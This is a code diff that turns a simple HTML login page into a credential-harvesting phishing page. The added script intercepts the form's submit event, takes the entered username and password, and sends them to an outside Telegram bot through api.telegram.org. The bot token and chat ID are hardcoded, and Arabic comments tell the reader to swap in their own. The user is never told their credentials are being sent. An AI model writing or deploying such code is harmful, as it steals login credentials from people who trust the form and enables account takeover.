@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,29 +7,55 @@
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
+    <div>
+        
+    </div>
     <div class="wrapper">
-        <form action="aaalli.html">
+        <form id="loginForm">
             <h1>log in</h1>
             <div class="input-box">
-                <input type="text" placeholder="name" 
-                required>
-                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAllJREFUSEuNlc9vTVEQxz8Ta0kbokLYdMHSyh8gpUosVaz8BRLRJrUS3dFoWNjbai2RvrR+LG3txMKGqBJCsCTjzb3n3HvO3Hve69m8l3vmnJnznc/MCIUlgFZ7gqDhf2ocvleGwTr/CWe9g/bmfKfzvWTog9iFA4ELwyBvoUwH8/fATeBZnwCpa/s/bi0J3K7lMsFa6UAXEVZ79GvurB2kOubuZkEGoDvAErAZts8Ad4CDwAzwol8wQcYouQUyA3oJYd1FOg+sARvAOS9L+uLsOU6KH8AEsBf444jaJ/BNYRvkcBQul5H8BT1KfQEOAPsRvrsXRAdmY1L1SG0od1zWXAf2TfPTgMnxOH+BzIOuIQxQ5jr3RCgcFTkrwizKANhBWERlC3RPcLoiMKUhySUUuy9Iq7f2fh1YAeziZMm/ClO4P4rzYh24fBxDWEAxPP8ivERZBd756nBBlHOQUjGuEn0as3eWklPhWUd9EjhR05TR/lXQNwqvhxjba373BVKQSOZAHwJTo6JrL5Rt0CsIz33b6HNwHngaDj8ZlsoyqDW3n64iJwSmFZYBO2PLcDXqMtMGTUEnFd6GyK3X3Ghk6ekpCeJ3BV1Q+AwcB37F/uZ70TWEeyivgFONkR84ncFSWVpRWuO7KvCgnkGxkttMryNcROsOGXM6shhbNc4ibKA8GuJ7OeLrc/ABOAJMZpp7PPqn2yHgE8hHQY+mUzQ9HpqpKRf7qi+dbOD4zTi8m8ALraIzufISGFE8OWlZDhqY0m7qxCmNlbxT734mp7R0yXG0u1EV7P8DTEvSIoq9bwgAAAAASUVORK5CYII="/>
+                <input type="text" id="username" placeholder="name" required>
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAllJREFUSEuNlc9vTVEQxz8Ta0kbokLYdMHSyh8gpUosVaz8BRLRJrUS3dFoWNjbai2RvrR+LG3txMKGqBJCsCTjzb3n3HvO3Hve69m8l3vmnJnznc/MCIUlgFZ7gqDhf2ocvleGwTr/CWe9g/bmfKfzvWTog9iFA4ELwyBvoUwH8/fATeBZnwCpa/s/bi0J3K7lMsFa6UAXEVZ79GvurB2kOubuZkEGoDvAErAZts8Ad4CDwAzwol8wQcYouQUyA3oJYd1FOg+sARvAOS9L+uLsOU6KH8AEsBf444jaJ/BNYRvkcBQul5H8BT1KfQEOAPsRvrsXRAdmY1L1SG0od1zWXAf2TfPTgMnxOH+BzIOuIQxQ5jr3RCgcFTkrwizKANhBWERlC3RPcLoiMKUhySUUuy9Iq7f2fh1YAeziZMm/ClO4P4rzYh24fBxDWEAxPP8ivERZBd756nBBlHOQUjGuEn0as3eWklPhWUd9EjhR05TR/lXQNwqvhxjba373BVKQSOZAHwJTo6JrL5Rt0CsIz33b6HNwHngaDj8ZlsoyqDW3n64iJwSmFZYBO2PLcDXqMtMGTUEnFd6GyK3X3Ghk6ekpCeJ3BV1Q+AwcB37F/uZ70TWEeyivgFONkR84ncFSWVpRWuO7KvCgnkGxkttMryNcROsOGXM6shhbNc4ibKA8GuJ7OeLrc/ABOAJMZpp7PPqn2yHgE8hHQY+mUzQ9HpqpKRf7qi+dbOD4zTi8m8ALraIzufISGFE8OWlZDhqY0m7qxCmNlbxT734mp7R0yXG0u1EV7P8DTEvSIoq9bwgAAAAASUVORK5CYII=" />
             </div>
             <div class="input-box">
-                <input type="password" placeholder="password" 
-                required>
-                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAdFJREFUSEuFlr8uRUEQxn/jFUQhEokoaL2Chk4j3kGiktuIhlAQhYp3UOluQuIVFBqdkIhKvIEsd8+e/TM7e84t7p/dnZ1vvu+bOVfIXgK48CY4XLWZL0B1Pi3EzdmS+fJn/U761jobz4SjeUSRYODSXWAf2Awgn3ByI7j7vuIejgYhLXzZ+pXAxKLr/8yJE05LLmsahyjaA+5CsjOQW49UOMBxHAK3gMec/pzZjiJNWoL7DLIB7hDhWiE9Fjh38ACyHRLnH/7iMZF/gTlgAfhWgi8CX8APyHxyXa600NQglN/XEoBUirlQ/aCWbSd6WLEx+ibJNYsAbLMUFcz4Us2VvBepVGIaCRRFhoV2gAtgvdszEttwX4EJMNUDQOf4BJa01Yo+aHf4G8hqXnht06olDbjGSFAjrZgeuoIarB6I4XejfcrxY3SgV9oONo2gCSssWw+7ZM32CGl3fj8XYmyWIKALXq2Yry41snRLXQWZTiMatBS1vYq/P8mY8RUD/O4wCw3V+8bJt9NFUcAsfXysGb6p534IHKXoA1hO4a1aTEe9Ayt1J5d0zkbFJbA2Niry6sG9AEcg00ID04v9/GmDVw8Wjblk2c4xpOO4h+Pflj9p8sAgTay64AAAAABJRU5ErkJggg=="/>
+                <input type="password" id="password" placeholder="password" required>
+                <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABgAAAAYCAYAAADgdz34AAAAAXNSR0IArs4c6QAAAdFJREFUSEuFlr8uRUEQxn/jFUQhEokoaL2Chk4j3kGiktuIhlAQhYp3UOluQuIVFBqdkIhKvIEsd8+e/TM7e84t7p/dnZ1vvu+bOVfIXgK48CY4XLWZL0B1Pi3EzdmS+fJn/U761jobz4SjeUSRYODSXWAf2Awgn3ByI7j7vuIejgYhLXzZ+pXAxKLr/8yJE05LLmsahyjaA+5CsjOQW49UOMBxHAK3gMec/pzZjiJNWoL7DLIB7hDhWiE9Fjh38ACyHRLnH/7iMZF/gTlgAfhWgi8CX8APyHxyXa600NQglN/XEoBUirlQ/aCWbSd6WLEx+ibJNYsAbLMUFcz4Us2VvBepVGIaCRRFhoV2gAtgvdszEttwX4EJMNUDQOf4BJa01Yo+aHf4G8hqXnht06olDbjGSFAjrZgeuoIarB6I4XejfcrxY3SgV9oONo2gCSssWw+7ZM32CGl3fj8XYmyWIKALXq2Yry41snRLXQWZTiMatBS1vYq/P8mY8RUD/O4wCw3V+8bJt9NFUcAsfXysGb6p534IHKXoA1hO4a1aTEe9Ayt1J5d0zkbFJbA2Niry6sG9AEcg00ID04v9/GmDVw8Wjblk2c4xpOO4h+Pflj9p8sAgTay64AAAAABJRU5ErkJggg==" />
             </div>
             <div class="remeber-forgot">
                 <label><input type="checkbox">Remember me</label>
-                <a href="aaalli.html">forgot password?</a>
-                </div>
-                <button type="button" class="btn">login</button>
-                <div class="regisiter-link">
-                    <p>Don't have a account <a href="aaalli.html">Regisiter</a></p>
-                </div>
+                <a href="#">forgot password?</a>
+            </div>
+            <button class="btn" type="submit">login</button>
+            <div class="regisiter-link">
+                <p>Don't have an account <a href="aaalli.html">Register</a></p>
             </div>
         </form>
     </div>
+
+    <script>
+        const botToken = '7901746245:AAHwlQmHuAmI5I9EI-Jo_gqBi6tTaE_wgcQ';  // استبدل برمز البوت الخاص بك
+        const chatId = '6526594170';  // استبدل بمعرف الدردشة الخاص بك
+
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();  // منع إرسال النموذج بشكل تقليدي
+
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            // إعداد الرسالة
+            const message = `\nاسم المستخدم: ${username}\nكلمة المرور: ${password}`;
+            // إرسال البيانات إلى بوت Telegram
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            
+            fetch(url)
+                .then(response => response.json())
+                .then(data => {
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    alert('حدث خطأ أثناء إرسال البيانات.');
+                });
+        });
+    </script>
 </body>
 </html>
